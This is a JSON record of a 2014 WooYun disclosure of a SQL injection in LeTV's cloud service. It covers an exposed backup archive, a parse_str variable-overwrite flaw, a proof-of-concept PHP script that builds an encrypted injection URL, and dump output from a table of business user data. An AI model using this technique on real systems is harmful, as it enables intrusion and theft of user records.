{"id": 47302, "wybug_id": "wooyun-2014-087245", "wybug_title": "乐视某重要业务注入可导致大量企业信息泄露", "wybug_corp": "乐视网", "wybug_author": "杀器王子", "wybug_date": "2014-12-15 16:22", "wybug_open_date": "2015-01-29 16:24", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向公众公开  简要描述： 杀器发现 变量覆盖 导致随意注入 详细说明：  http://www.letvcloud.com/www.tar.gz 乐视云存在备份文件www/Home/Lib/Action/UserAction.class.php\npublic function auditupdate() {\t\timport ( \"@.ORG.Util\" );\t\t$ua = $this->_get('ua');\t\t$uaid = $this->decrypturl($ua);\t\tparse_str($uaid);\t\t$userDao = D ( 'Userdetail' );\t\t$lists = $userDao->get ( $userid );\t\t$this->assign ( \"lists\", $lists );\t\t$webtypeselectHtml = Util::getSelectHtml ( 'sitetypeid', $this->_getWebTypeList (), 'sitetypeid', 'sitetypename', $lists ['sitetypeid'], 1, false );\t\t//所在地\t\t$cityaction = A('City');\t\t$province = $cityaction->getprovince();\t\t$provincehtml = Util::getSelectHtml('province',$province,'cityid','cityname',$lists['province'],1,true,'--请选择--');\t\t$cityDao = D('City');\t\t$citylist = $cityDao->getList(false,0,0,'parentid='.$lists ['province']);\t\t$cityhtml = Util::getSelectHtml('city',$citylist,'cityid','cityname',$lists['city'],1,true,'--请选择--');\t\t$this->assign ( \"webtypeselectHtml\", $webtypeselectHtml );\t\t$this->assign ( \"userid\", $userid );\t\t$this->assign ( \"ua\", $ua );\t\t$this->assign ( \"provincehtml\", $provincehtml );\t\t$this->assign ( \"cityhtml\", $cityhtml );\t\t$this->display ();\t}\n这个地方 存在变量覆盖parse_str($uaid);uaid可覆盖任意变量ua为aes加密后的内容 用decrypturl解密在配置文件中找到AESkey    漏洞证明：  \n<?phpinclude(\"aes.php\");$sql=$_GET['sql'];\n\nmask 区域\n\n*****AES(tr**********D398bslw**********t;makeKe*****\n\n\n\n$uaid = $aes->encryptString(\"userid=\".$sql, $keys);echo \"http://www.letvcloud.com/user/auditupdate?ua=\".$uaid.\"<br>\";echo file_get_contents(\"http://www.letvcloud.com/user/auditupdate?ua=\".$uaid);?>\n用上面脚本本地转一个就可以乱入了 直接覆盖userid变量带入sql查询\n\n\nTable: user_detail_info[28 columns]+-------------------+--------------+| Column            | Type         |+-------------------+--------------+| address           | varchar(200) || allowclone        | tinyint(4)   || ark               | int(4)       || audittext         | text         || businesslicense   | varchar(200) || city              | varchar(50)  || codeversionrights | varchar(20)  || codeversions      | varchar(20)  || company           | varchar(100) || ctime             | int(11)      || domainname        | varchar(100) || email             | varchar(100) || is_showsearch     | tinyint(1)   || limit_upload      | int(10)      || mobile            | varchar(100) || parentid          | int(11)      || password          | varchar(100) || province          | varchar(50)  || reasonid          | int(11)      || sitename          | varchar(200) || sitetypeid        | tinyint(3)   || source            | varchar(20)  || status            | tinyint(1)   || telephone         | varchar(100) || userid            | int(11)      || username          | varchar(100) || usertype          | tinyint(3)   || utime             | int(11)      |+-------------------+--------------+[14:09:51] [INFO] fetching entries for table 'user_detail_info' on database 'bcloud'[14:09:51] [INFO] the SQL query used returns 37737 entries[14:09:53] [INFO] retrieved: 5/37737 entries\n3w+企业用户，影响极大   修复方案：  提高运维人员安全意识   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-12-15 18:01 厂商回复： 必须修复~~~~~王子，好人啊~~~~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-15 16:23 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  又见杀气    \n     2014-12-15 16:25 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  乐视洞真多，求杀器    \n     2015-01-31 21:57 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  叼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}